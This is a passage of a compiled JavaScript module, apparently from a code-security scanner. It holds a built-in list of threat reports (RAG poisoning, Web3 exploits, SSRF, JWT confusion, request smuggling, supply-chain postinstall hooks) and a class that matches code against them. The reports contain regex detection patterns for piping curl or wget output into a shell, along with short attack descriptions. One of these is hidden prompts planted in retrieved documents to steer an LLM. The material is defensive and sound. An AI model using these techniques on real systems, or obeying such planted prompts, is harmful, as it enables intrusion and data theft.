        referenceUrl: 'https://owasp.org/www-project-top-10-for-large-language-model-applications/'
    },
    {
        id: 'REP-AI-RAG-005',
        title: 'RAG Knowledge Base Document Poisoning & Latent Embedding Inversion',
        source: 'HEXORA_RESEARCH',
        date: '2026-10-22',
        severity: 'HIGH',
        category: 'AI_AGENT',
        targetEcosystem: 'AI_AGENT',
        vulnerabilityClass: 'RAG Poisoning / Knowledge Corruption',
        attackVariants: [
            'Invisible Unicode Zero-Width Instruction Smuggling in Markdown',
            'Polyglot PDF Injection with Hidden OCR Layers',
            'Vector Database Nearest-Neighbor Retrieval Collision Attack',
            'Prompt Prepending via High-Similarity Noise Flooding',
            'Latent Embedding Inversion to Reconstruct Private Knowledge Chunks'
        ],
        triggerPatterns: [
            'embeddings\\.create',
            'vectorStore\\.similaritySearch',
            'retrieveContext',
            'langchain.*retrievers'
        ],
        summary: 'Adversaries craft documents containing invisible zero-width unicode characters or adversarial embeddings designed to collide with top search queries in vector databases.',
        exploitMechanism: 'Uploaded documentation contains hidden prompts that win cosine similarity calculations and force the LLM to deliver attacker-crafted answers.',
        mitigation: 'Strip non-printable and zero-width unicode before tokenization, verify document signatures, and apply multi-perspective relevance scoring.',
        referenceUrl: 'https://cwe.mitre.org/data/definitions/20.html'
    },
    // Web3 & Decentralized Finance
    {
        id: 'REP-WEB3-006',
        title: 'ERC-4337 Account Abstraction Bundler Frontrunning & Paymaster Drain',
        source: 'IMMUNEFI',
        date: '2026-09-12',
        severity: 'CRITICAL',
        category: 'WEB3',
        targetEcosystem: 'WEB3_EVM',
        vulnerabilityClass: 'Account Abstraction Gas Drain / Bundler Frontrunning',
        attackVariants: [
            'UserOperation Simulation vs Execution State Desync',
            'Paymaster Validation Gas Manipulation',
            'Signature Malleability in validateUserOp',
            'Storage Access Rule Violation in UserOp Validation Loop',
            'Bundler Mempool Frontrunning via Gas Price Bumping'
        ],
        triggerPatterns: [
            'validateUserOp',
            'validatePaymasterUserOp',
            'entryPoint\\.handleOps',
            'IPaymaster'
        ],
        summary: 'ERC-4337 smart contract wallets and paymasters can be drained if validation functions access mutable storage slots or fail to prevent signature replay.',
        exploitMechanism: 'Attacker creates a UserOperation that passes simulation but reverts in execution, forcing the paymaster or bundler to pay gas fees without compensation.',
        mitigation: 'Adhere strictly to ERC-4337 storage access rules and verify nonces and signatures using canonical EntryPoint contracts.',
        referenceUrl: 'https://eips.ethereum.org/EIPS/eip-4337'
    },
    {
        id: 'REP-WEB3-007',
        title: 'Read-Only Reentrancy across Curve & Uniswap V3 Price Oracles',
        source: 'PARADIGM',
        date: '2026-08-04',
        severity: 'CRITICAL',
        category: 'WEB3',
        targetEcosystem: 'WEB3_EVM',
        vulnerabilityClass: 'Oracle Manipulation via Read-Only Reentrancy',
        attackVariants: [
            'Curve remove_liquidity View Function Reentrancy',
            'Uniswap V3 Flash Mint Callback Oracle Desynchronization',
            'Balancer Pool onJoin/onExit Intermediate Balance Sniping',
            'Staked Token (LST) Collateral Ratio Read-Only Inversion',
            'Lending Protocol Bad Debt Minting during Oracle Settlement Window'
        ],
        triggerPatterns: [
            'get_virtual_price',
            'ICurvePool',
            'uniswapV3Pool\\.slot0',
            'balanceOf\\(address\\(this\\)\\)'
        ],
        summary: 'While state-modifying functions protect against reentrancy, view functions returning LP prices continue to report inflated rates during liquidity removal.',
        exploitMechanism: 'Attacker removes liquidity from a pool, triggering a native token transfer callback where they borrow against the inflated LP token price before settlement.',
        mitigation: 'Use nonReentrant guards on view functions or verify pool reentrancy status before querying virtual price.',
        referenceUrl: 'https://chainsecurity.com/curve-lp-oracle-manipulation-post-mortem/'
    },
    {
        id: 'REP-WEB3-008',
        title: 'Permit2 Signature Replay & Nonce Collision in Cross-Chain Swaps',
        source: 'IMMUNEFI',
        date: '2026-07-28',
        severity: 'HIGH',
        category: 'WEB3',
        targetEcosystem: 'WEB3_EVM',
        vulnerabilityClass: 'Signature Replay / Allowance Hijacking',
        attackVariants: [
            'Cross-Chain Permit Signature Replay via Missing ChainID',
            'Deadline Bypass via Zero-Timestamp Evaluation',
            'Unchecked Dynamic Allowance Invalidation',
            'Signature Malleability via High-S secp256k1 Curve Values',
            'Permit Batch Order Frontrunning with Partial Signature Spoofing'
        ],
        triggerPatterns: [
            'permit2\\.permit',
            'permitWitnessTransferFrom',
            'ISignatureTransfer',
            'ecrecover\\('
        ],
        summary: 'Uniswap Permit2 and EIP-712 permits without domain separator chainId verification allow signatures created on one network to be replayed on forks or rollups.',
        exploitMechanism: 'Attacker signs an off-chain permit on Ethereum mainnet, which the attacker re-submits on Arbitrum where the user also holds balance and has approved Permit2.',
        mitigation: 'Always include chainId and verifyingContract in EIP-712 domain separators and verify nonces sequentially.',
        referenceUrl: 'https://docs.uniswap.org/contracts/permit2/overview'
    },
    {
        id: 'REP-WEB3-009',
        title: 'Cross-Chain Bridge Merkle Tree Proof Forgery & Zero-Length Leaf Bypass',
        source: 'TRAIL_OF_BITS',
        date: '2026-06-19',
        severity: 'CRITICAL',
        category: 'WEB3',
        targetEcosystem: 'WEB3_CROSSCHAIN',
        vulnerabilityClass: 'Cryptographic Proof Forgery',
        attackVariants: [
            'Zero-Length Merkle Leaf Injection',
            'Double-Spend via Relayer Message Sequence Desynchronization',
            'Second-Preimage Attack on Multi-Level Merkle Trees',
            'Incomplete Multi-Sig Validator Quorum Verification',
            'Replay of Historic Finality Proofs on Forked State'
        ],
        triggerPatterns: [
            'verifyProof\\s*\\(',
            'MerkleProof\\.verify',
            'keccak256\\s*\\(abi\\.encodePacked\\(',
            'bridgeRelay'
        ],
        summary: 'Bridges using standard 64-byte `abi.encodePacked` in Merkle tree hashing are vulnerable to hash collision second-preimage attacks.',
        exploitMechanism: 'Attacker pairs adjacent intermediate leaf hashes to form a fake leaf that satisfies the Merkle root, minting bridged assets out of thin air.',
        mitigation: 'Use OpenZeppelin MerkleProof with leaf-prefix domain separators and enforce strict tree depth validation.',
        referenceUrl: 'https://swcregistry.io/docs/SWC-117/'
    },
    // Cloud & Microservice Architecture
    {
        id: 'REP-CLOUD-010',
        title: 'Cloud IMDSv2 Token Reflection & Hop-by-Hop Header Stripping',
        source: 'PROJECT_ZERO',
        date: '2026-05-14',
        severity: 'HIGH',
        category: 'CLOUD',
        targetEcosystem: 'CLOUD',
        vulnerabilityClass: 'SSRF / Cloud Credential Extraction',
        attackVariants: [
            'X-Forwarded-For Hop-by-Hop Header Stripping',
            'Docker Bridge Container IMDSv2 Token Reflection',
            'IPv6 Dual-Stack [fd00:ec2::254] Metadata Retrieval',
            'DNS Rebinding to 169.254.169.254 via Custom Domain TTL 0',
            'Cloud Run / Lambda Instance Identity Token Theft via Local UNIX Socket'
        ],
        triggerPatterns: [
            '169\\.254\\.169\\.254',
            'latest\/meta-data',
            'X-aws-ec2-metadata-token',
            'http:\/\/metadata\\.google\\.internal'
        ],
        summary: 'Even when cloud metadata is protected by IMDSv2 PUT token headers, SSRF vulnerabilities in reverse proxies that forward client headers allow attackers to forge tokens.',
        exploitMechanism: 'Attacker leverages an HTTP proxy that allows header manipulation to execute the PUT request and extract IAM role temporary STS credentials.',
        mitigation: 'Enforce hop limit = 1 on AWS IMDSv2, block 169.254.169.254 and IPv6 equivalents at the firewall or egress gateway.',
        referenceUrl: 'https://cwe.mitre.org/data/definitions/918.html'
    },
    {
        id: 'REP-CLOUD-011',
        title: 'Serverless Shared Memory (/dev/shm) Snooping & Cross-Tenant Cold Start Leak',
        source: 'HEXORA_RESEARCH',
        date: '2026-04-11',
        severity: 'HIGH',
        category: 'CLOUD',
        targetEcosystem: 'CLOUD',
        vulnerabilityClass: 'Information Disclosure / MicroVM Leakage',
        attackVariants: [
            '/dev/shm Shared POSIX Memory Block Snooping',
            'Persistent Global Variable Cross-Invocation Context Contamination',
            'Database Connection Pool Reuse without Session Reset',
            'Tmpfs Residual File Extraction across Warm Lambda Invocations',
            'CPU Microarchitectural Side-Channel on Shared Virtualized Cores'
        ],
        triggerPatterns: [
            '\/dev\/shm',
            'global\\.[a-zA-Z0-9_]+\\s*=',
            'shared_memory',
            'global\\.tenantContext'
        ],
        summary: 'Serverless function handlers that store tenant data or secrets in global scope or `/dev/shm` leak sensitive data to subsequent invocations in warm containers.',
        exploitMechanism: 'Attacker sends a request that fails authentication, but inspects global state or shared memory populated by a previous authenticated customer.',
        mitigation: 'Clear tenant-specific state inside `finally` blocks, re-initialize database connections, and avoid module-level persistent stores.',
        referenceUrl: 'https://cwe.mitre.org/data/definitions/200.html'
    },
    // Modern APIs & Protocols
    {
        id: 'REP-API-012',
        title: 'GraphQL Alias Batching & Circular Fragment Recursive Denial-of-Service',
        source: 'OWASP',
        date: '2026-03-30',
        severity: 'MEDIUM',
        category: 'API',
        targetEcosystem: 'WEB2',
        vulnerabilityClass: 'Denial of Service / Rate Limit Bypass',
        attackVariants: [
            'Field Alias Multiplexing to Evade Rate Limits (10,000 queries in 1 payload)',
            'Circular Fragment Recursive Depth Bomb',
            'Directive Bypass for Field-Level Authentication',
            'Batch Operation Array Flooding',
            'Introspection Query Scraping to Map Hidden Mutation Endpoints'
        ],
        triggerPatterns: [
            'createYoga',
            'ApolloServer',
            'buildSchema',
            'graphqlHTTP'
        ],
        summary: 'GraphQL APIs that do not enforce query cost analysis or depth limits can be crippled by single HTTP requests containing thousands of aliased fields.',
        exploitMechanism: 'Adversary crafts a request with 5,000 aliased database lookup fields, causing synchronous N+1 queries that saturate database connection pools.',
        mitigation: 'Implement `graphql-depth-limit`, query complexity analysis, and disable schema introspection in production.',
        referenceUrl: 'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL'
    },
    {
        id: 'REP-API-013',
        title: 'JWT Algorithm Confusion (HMAC vs RSA) & Key Confusion Attacks',
        source: 'PROJECT_ZERO',
        date: '2026-03-12',
        severity: 'CRITICAL',
        category: 'AUTH',
        targetEcosystem: 'WEB2',
        vulnerabilityClass: 'Authentication Bypass / Cryptographic Downgrade',
        attackVariants: [
            'HMAC Verification using RSA Public Key as Shared Secret',
            'None Algorithm Header Bypass ("alg": "none")',
            'Embedded JWK Public Key Injection ("jwk" Header Parameter)',
            'JKU Header URL Spoofing via Open Redirect',
            'KID Parameter SQL Injection / Path Traversal to Known Empty File'
        ],
        triggerPatterns: [
            'jwt\\.verify\\s*\\(',
            'jwt\\.decode\\s*\\(',
            'jsonwebtoken',
            'jose\\.jwtVerify'
        ],
        summary: 'When JWT libraries accept arbitrary algorithms specified in the token header, attackers can sign tokens using HS256 with the server public RSA key.',
        exploitMechanism: 'Attacker downloads the server public RSA key, signs a forged JWT with role="admin" using HS256 and the public key string, which the server verifies successfully.',
        mitigation: 'Explicitly enforce `algorithms: ["RS256"]` in verification options, forbid `alg: "none"`, and validate JWK/JKU sources strictly.',
        referenceUrl: 'https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/'
    },
    {
        id: 'REP-API-014',
        title: 'Fastify & Express Mass Assignment & Prototype Pollution Gadgets',
        source: 'HEXORA_RESEARCH',
        date: '2026-02-24',
        severity: 'HIGH',
        category: 'INJECTION',
        targetEcosystem: 'WEB2',
        vulnerabilityClass: 'Mass Assignment / Remote Code Execution',
        attackVariants: [
            'Hidden Admin Field Injection via Object Spread ({ ...req.body })',
            'Array-to-Object Type Forgery bypassing schema validation',
            'Prototype Pollution Gadget in Child Process spawn options',
            'Template Engine Compilation Hook Hijacking via polluted prototype',
            'Schema Stripping Evasion using Nested JSON Payloads',
            'Session SessionID Overwrite via Parameter Smuggling'
        ],
        triggerPatterns: [
            '\\{\\s*\\.\\.\\.req\\.body\\s*\\}',
            'Object\\.assign\\s*\\(.*req\\.body',
            'User\\.create\\s*\\(req\\.body',
            'deepAssign'
        ],
        summary: 'Directly spreading or assigning `req.body` into database models or system objects allows attackers to overwrite internal properties such as `isAdmin` or `role`.',
        exploitMechanism: 'Attacker appends `"isAdmin": true, "role": "superuser"` to a registration payload, which gets saved directly to the database.',
        mitigation: 'Use strict DTOs (Data Transfer Objects) with whitelist validation libraries like Zod or TypeBox, explicitly picking permitted fields.',
        referenceUrl: 'https://cwe.mitre.org/data/definitions/915.html'
    },
    {
        id: 'REP-API-015',
        title: 'HTTP Request Smuggling (TE.CL / CL.TE) & Reverse Proxy Cache Poisoning',
        source: 'PORT_SWIGGER',
        date: '2026-02-05',
        severity: 'CRITICAL',
        category: 'INJECTION',
        targetEcosystem: 'WEB2',
        vulnerabilityClass: 'Request Smuggling / Protocol Desync',
        attackVariants: [
            'TE.CL Discrepancy via Obfuscated Transfer-Encoding Header',
            'CL.TE Discrepancy via Dual Content-Length Values',
            'Transfer-Encoding Header Obfuscation (Chunked with Trailing Whitespace)',
            'Reverse Proxy Cache Key Poisoning via Smuggled Response',
            'Credential Interception of Next In-Flight HTTP Request on Keep-Alive Socket'
        ],
        triggerPatterns: [
            'Transfer-Encoding',
            'Content-Length',
            'keep-alive',
            'proxy_pass'
        ],
        summary: 'Discrepancies in how front-end load balancers and back-end servers parse conflicting Content-Length and Transfer-Encoding headers allow request smuggling.',
        exploitMechanism: 'Attacker sends a malformed HTTP request where the back-end processes the remainder as the start of the next user request, hijacking sessions.',
        mitigation: 'Use HTTP/2 or HTTP/3 end-to-end, normalize HTTP headers, and reject requests containing both Content-Length and Transfer-Encoding.',
        referenceUrl: 'https://portswigger.net/web-security/request-smuggling'
    },
    {
        id: 'REP-SEC-016',
        title: 'Polyglot Deserialization Gadget Chains in Python, Java & Node.js',
        source: 'OWASP',
        date: '2026-01-19',
        severity: 'CRITICAL',
        category: 'INJECTION',
        targetEcosystem: 'CROSS_PLATFORM',
        vulnerabilityClass: 'Insecure Deserialization / Remote Code Execution',
        attackVariants: [
            'Python PyYAML yaml.load without SafeLoader',
            'Python pickle.loads Unpickling Exploit with __reduce__ RCE Payload',
            'Java Jackson Polymorphic Type Handling (enableDefaultTyping)',
            'Fastjson AutoType Feature Sandbox Bypass',
            'Node.js node-serialize eval() Gadget Injection'
        ],
        triggerPatterns: [
            'yaml\\.load\\s*\\(.*Loader\\s*=\\s*yaml\\.Loader',
            'pickle\\.loads\\s*\\(',
            'node-serialize',
            'enableDefaultTyping',
            '_$$ND_FUNC$$_',
            'JSON\\.parse\\s*\\(.*__proto__'
        ],
        summary: 'Deserializing untrusted data with formats supporting executable types or custom constructors triggers arbitrary code execution before type validation.',
        exploitMechanism: 'Attacker supplies a serialized object containing a callable gadget chain (e.g. `subprocess.Popen`), executing shell commands upon deserialization.',
        mitigation: 'Never deserialize data with pickle or raw yaml.load. Use json.loads, yaml.safe_load, or strict schema deserializers.',
        referenceUrl: 'https://cwe.mitre.org/data/definitions/502.html'
    },
    {
        id: 'REP-SUPPLY-017',
        title: 'Software Supply Chain Dependency Confusion & Malicious Postinstall Hooks',
        source: 'COMMUNITY',
        date: '2026-01-08',
        severity: 'CRITICAL',
        category: 'SUPPLY_CHAIN',
        targetEcosystem: 'CROSS_PLATFORM',
        vulnerabilityClass: 'Supply Chain Hijack / Arbitrary Code Execution',
        attackVariants: [
            'Public npm/PyPI Registry Dependency Confusion Namespace Attack',
            'Typosquatting Popular Packages (e.g. lo-dash, reqeusts)',
            'Malicious postinstall / setup.py Shell Execution during CI/CD Build',
            'Stolen CI/CD Token Stealing Artifact via Obfuscated install Script',
            'Developer Machine SSH Key Exfiltration during Package Installation',
            'Compromised Maintainer Account Credential Stuffing'
        ],
        triggerPatterns: [
            '"postinstall"\\s*:',
            'cmd\\.run\\s*\\(.*setup\\.py',
            'curl.*\\|.*sh',
            'wget.*\\|.*bash'
        ],
        summary: 'Internal un-scoped package names published on public registries take precedence over private feeds unless strict scoping is configured.',
        exploitMechanism: 'Attacker registers an internal company package name on npmjs.org with version 99.9.9 and a postinstall script that exfiltrates `.env` secrets.',
        mitigation: 'Scope all internal packages (@company/pkg), configure `.npmrc` with strict registries, and run `npm install --ignore-scripts` in CI.',
        referenceUrl: 'https://cwe.mitre.org/data/definitions/829.html'
    },
    {
        id: 'REP-SEC-018',
        title: 'Cross-Site WebSocket Hijacking (CSWSH) & Binary Frame Desynchronization',
        source: 'OWASP',
        date: '2025-12-14',
        severity: 'HIGH',
        category: 'AUTH',
        targetEcosystem: 'WEB2',
        vulnerabilityClass: 'WebSocket Security / Session Hijacking',
        attackVariants: [
            'Missing Origin Header Validation during WebSocket Handshake',
            'Cookie-Based Authentication Hijacking in WebSocket Upgrade',
            'Binary Protobuf Frame Desynchronization',
            'Unauthenticated Internal RPC Bridge Over WebSocket',
            'State-Machine Injection via Interleaved WebSocket Messages'
        ],
        triggerPatterns: [
            'new WebSocketServer',
            'ws\\.on\\s*\\(\'connection\'',
            'upgradeReq',
            'socket\\.io'
        ],
        summary: 'WebSockets do not enforce Same-Origin Policy by default. Browsers send ambient cookies during the handshake, allowing malicious websites to open connections.',
        exploitMechanism: 'Victim visits a malicious site, which initiates a WebSocket connection to `wss://bank.com/ws`. Because cookies are included, the attacker executes transactions.',
        mitigation: 'Strictly validate the `Origin` header against an approved whitelist during the HTTP upgrade handshake and use anti-CSRF challenge tokens.',
        referenceUrl: 'https://owasp.org/www-community/vulnerabilities/Cross-Site_WebSocket_Hijacking'
    },
    {
        id: 'REP-SEC-019',
        title: 'OAuth2 PKCE Downgrade & State Parameter CSRF Bypass',
        source: 'IETF',
        date: '2025-11-20',
        severity: 'HIGH',
        category: 'AUTH',
        targetEcosystem: 'WEB2',
        vulnerabilityClass: 'OAuth2 Authorization Code Interception',
        attackVariants: [
            'PKCE Downgrade via code_verifier Parameter Stripping',
            'State Parameter Omission or Static Value CSRF Injection',
            'Redirect URI Wildcard & Path Traversal Parameter Pollution',
            'Implicit Grant Flow Token Leakage via Referrer Header',
            'Token Exchange Replay across Identity Providers'
        ],
        triggerPatterns: [
            'response_type=code',
            'code_challenge',
            'passport\\.use',
            'redirect_uri'
        ],
        summary: 'Failing to enforce PKCE (RFC 7636) or omitting unpredictable `state` parameters in OAuth2 flows allows attackers to intercept authorization codes.',
        exploitMechanism: 'Attacker tricks victim into clicking an authorization link with the attacker state parameter, binding the victim account to the attacker credentials.',
        mitigation: 'Enforce PKCE with S256 challenge method, cryptographically sign state parameters with short TTLs, and use exact string matching for redirect URIs.',
        referenceUrl: 'https://datatracker.ietf.org/doc/html/rfc7636'
    },
    {
        id: 'REP-SEC-020',
        title: 'DNS Rebinding for Intranet SSRF Defense Bypass',
        source: 'HEXORA_RESEARCH',
        date: '2025-10-18',
        severity: 'HIGH',
        category: 'INJECTION',
        targetEcosystem: 'WEB2',
        vulnerabilityClass: 'DNS Rebinding / SSRF Defense Evasion',
        attackVariants: [
            'Short-TTL (0s) DNS Flips from Public to 127.0.0.1',
            'Hexadecimal / Decimal IPv4 Encoding Bypass (0x7f000001 / 2130706433)',
            '0.0.0.0 IP Resolution Tricking Loopback Bindings',
            'IPv6 Mapped IPv4 Loopback Addresses (::ffff:127.0.0.1)',
            'Dual-A Record Round-Robin Resolution Race Condition'
        ],
        triggerPatterns: [
            'dns\\.lookup',
            'gethostbyname',
            'axios\\.get\\s*\\(req\\.body',
            'fetch\\s*\\(req\\.query'
        ],
        summary: 'Applications that validate hostnames via DNS lookup and then fetch the URL allow attackers to return a public IP first, followed by 127.0.0.1 on the second lookup.',
        exploitMechanism: 'Attacker controls an authoritative DNS server with TTL=0. The app checks IP (public), but when downloading the content, the IP resolves to internal localhost.',
        mitigation: 'Resolve DNS once, validate the resolved IP address against private subnet CIDRs, and pin the connection directly to the verified IP.',
        referenceUrl: 'https://cwe.mitre.org/data/definitions/918.html'
    },
    {
        id: 'REP-SEC-021',
        title: 'Regular Expression Denial of Service (ReDoS) Catastrophic Backtracking',
        source: 'OWASP',
        date: '2025-09-05',
        severity: 'MEDIUM',
        category: 'DENIAL_OF_SERVICE',
        targetEcosystem: 'CROSS_PLATFORM',
        vulnerabilityClass: 'Algorithmic Complexity / Catastrophic Backtracking',
        attackVariants: [
            'Nested Quantifiers Exponential Explosion (e.g. (a+)+$)',
            'Overlapping Alternation with Repetition (e.g. (a|a)+$)',
            'Unanchored Dot-Star Greedy Matching on Long Inputs',
            'Polynomial Backtracking in Email Validation Expressions',
            'Event-Loop Starvation in Single-Threaded Node.js Runtimes'
        ],
        triggerPatterns: [
            '\\([^)]*\\+\\)[+*]',
            '\\([^)]*\\*\\)[+*]',
            'new RegExp\\s*\\(.*req\\.',
            'pattern\\.test\\('
        ],
        summary: 'Evaluating complex regular expressions with nested quantifiers against pathological input strings causes exponential CPU backtracking, halting execution.',
        exploitMechanism: 'Attacker supplies a 50-character crafted input like `aaaaaaaaaaaaaaaaaaaaaaaaaaaa!`, causing regex engines to perform billions of comparisons and freeze the process.',
        mitigation: 'Use non-backtracking regex engines like Google RE2, avoid nested quantifiers, and enforce strict length bounds before regex evaluation.',
        referenceUrl: 'https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS'
    },
    {
        id: 'REP-WEB3-022',
        title: 'Flash Loan Spot Price Oracle Manipulation & AMM Pool Depletion',
        source: 'IMMUNEFI',
        date: '2025-08-11',
        severity: 'CRITICAL',
        category: 'WEB3',
        targetEcosystem: 'WEB3_EVM',
        vulnerabilityClass: 'Economic Exploit / Spot Price Manipulation',
        attackVariants: [
            'Instantaneous Spot Price Skew via Massive Uniswap V2 Swap',
            'Flash Loan Borrowing paired with Collateral Valuation Inflate',
            'DEX Pool Reserve Ratio Tampering during Lending Liquidation',
            'Lack of Time-Weighted Average Price (TWAP) Protection',
            'Sandwich Attack Exploiting Dynamic Fee Calculations',
            'Multi-Pool Triangular Arbitrage Exploiting Slippage Bounds'
        ],
        triggerPatterns: [
            'getReserves',
            'balanceOf\\(address\\(this\\)\\)',
            'flashLoan\\s*\\(',
            'IUniswapV2Pair'
        ],
        summary: 'Using instantaneous `getReserves()` or `balanceOf()` from an AMM pool as a price oracle allows attackers to temporarily skew prices using uncollateralized flash loans.',
        exploitMechanism: 'Attacker borrows 100M DAI via flash loan, dumps it into Uniswap to crash DAI price, deposits manipulated collateral, borrows assets, and repays flash loan with profit.',
        mitigation: 'Never use spot reserves as price oracles. Use Chainlink decentralized oracles or Uniswap V3 TWAP with at least 30-minute observation windows.',
        referenceUrl: 'https://samczsun.com/so-you-want-to-use-a-uniswap-oracle/'
    }
];
export class ThreatKnowledgeBase {
    static instance = null;
    reports = new Map();
    storagePath;
    constructor(customStorageDir) {
        this.storagePath = path.join(customStorageDir || process.cwd(), '.hexora-results', 'threat-knowledge-db.json');
        this.initDefaultReports();
        this.loadPersistedReports();
    }
    static getInstance(storageDir) {
        if (!ThreatKnowledgeBase.instance) {
            ThreatKnowledgeBase.instance = new ThreatKnowledgeBase(storageDir);
        }
        return ThreatKnowledgeBase.instance;
    }
    initDefaultReports() {
        for (const report of BUILTIN_THREAT_REPORTS) {
            this.reports.set(report.id, report);
        }
    }
    /**
     * Synchronously registers an in-memory threat report (e.g. from Zero-Day live stream)
     */
    registerReport(report) {
        this.reports.set(report.id, report);
    }
    /**
     * Adds or updates a learned threat report in the knowledge base
     */
    async learnReport(report) {
        this.reports.set(report.id, report);
        await this.savePersistedReports();
    }
    /**
     * Matches code snippets or file content against known threat reports and attack variants
     */
    matchThreats(content, filePath, category) {
        const correlations = [];
        const lowerContent = content.toLowerCase();
        for (const report of this.reports.values()) {
            if (category && report.category !== category && report.category !== 'GENERAL') {
                if (report.severity !== 'CRITICAL')
                    continue;
            }
            let triggerPatternMatched = false;
            let detectedVariant = report.attackVariants[0] || 'Standard Exploit Vector';
            let matchCount = 0;
            // Check regex trigger patterns (strict)
            for (let i = 0; i < report.triggerPatterns.length; i++) {
                const patternStr = report.triggerPatterns[i];
                try {
                    const reg = new RegExp(patternStr, 'i');
                    if (reg.test(content)) {
                        triggerPatternMatched = true;
                        matchCount += 2;
                        if (report.attackVariants[i]) {
                            detectedVariant = report.attackVariants[i];
                        }
                    }
                }
                catch {
                    if (lowerContent.includes(patternStr.toLowerCase())) {
                        triggerPatternMatched = true;
                        matchCount += 2;
                    }
                }
            }
            // Check domain-specific keywords (ignore generic stop words like code, data, file, call, etc.)
            const stopWords = new Set([
                'code', 'file', 'data', 'text', 'call', 'type', 'test', 'user', 'view', 'name',
                'path', 'info', 'find', 'send', 'post', 'get', 'read', 'make', 'save', 'load',
                'arbitrary', 'vulnerability', 'remote', 'local', 'execution', 'security', 'system',
                'service', 'services', 'network', 'port', 'ports', 'access', 'attack', 'threat'
            ]);
            const classTerms = report.vulnerabilityClass.toLowerCase().split(/[\s/\\-]+/).filter(t => t.length > 3 && !stopWords.has(t));
            let termMatches = 0;
            for (const term of classTerms) {
                if (lowerContent.includes(term)) {
                    termMatches++;
                }
            }
            // Require genuine trigger pattern match OR at least 2 highly specific domain terms!
            if (triggerPatternMatched || (termMatches >= 2 && classTerms.length >= 2)) {
                const totalScore = triggerPatternMatched ? 0.85 + (matchCount * 0.05) : 0.60 + (termMatches * 0.08);
                const similarityScore = Math.min(0.99, Number(totalScore.toFixed(2)));
                correlations.push({
                    reportId: report.id,
                    title: report.title,
                    source: report.source,
                    similarityScore,
                    attackVariant: detectedVariant,
                    vulnerabilityClass: report.vulnerabilityClass,
                    exploitMechanism: report.exploitMechanism,
                    referenceUrl: report.referenceUrl
                });
            }
        }
        // Sort by highest similarity
        return correlations.sort((a, b) => b.similarityScore - a.similarityScore);
    }
    /**
     * Search threat reports by query keyword (CVE, class, technology, attack type)
     */
    searchReports(query) {
        const q = query.toLowerCase();
        const results = [];
        for (const report of this.reports.values()) {
            const inId = report.id.toLowerCase().includes(q);
            const inTitle = report.title.toLowerCase().includes(q);
            const inClass = report.vulnerabilityClass.toLowerCase().includes(q);
            const inSummary = report.summary.toLowerCase().includes(q);
            const inVariants = report.attackVariants.some((v) => v.toLowerCase().includes(q));
            if (inId || inTitle || inClass || inSummary || inVariants) {
                results.push(report);
            }
        }
        return results;
    }
    getAllReports() {
        return Array.from(this.reports.values());
    }
    getStats() {
        const all = Array.from(this.reports.values());
        let variantCount = 0;
        const variants = [];
        for (const r of all) {
            variantCount += r.attackVariants.length;
            for (const v of r.attackVariants) {
                variants.push(v);
            }
        }
        return {
            totalLearnedReports: all.length,
            totalAttackVariants: variantCount,
            matchedReportsCount: 0,
            detectedVariants: variants.slice(0, 10)
        };
    }
    loadPersistedReports() {
        try {
            if (fs.existsSync(this.storagePath)) {
                const data = fs.readFileSync(this.storagePath, 'utf-8');
                const customReports = JSON.parse(data);
                for (const rep of customReports) {
                    this.reports.set(rep.id, rep);
                }
            }
        }
        catch {
            // Ignore initial read error if empty
        }
    }
    async savePersistedReports() {
        try {
            const dir = path.dirname(this.storagePath);
            if (!fs.existsSync(dir)) {
                fs.mkdirSync(dir, { recursive: true });
            }
            const data = JSON.stringify(Array.from(this.reports.values()), null, 2);
            fs.writeFileSync(this.storagePath, data, 'utf-8');
        }
        catch (err) {
            console.error('Failed to persist threat knowledge base:', err.message);
        }
    }
}
//# sourceMappingURL=threatKnowledgeBase.js.map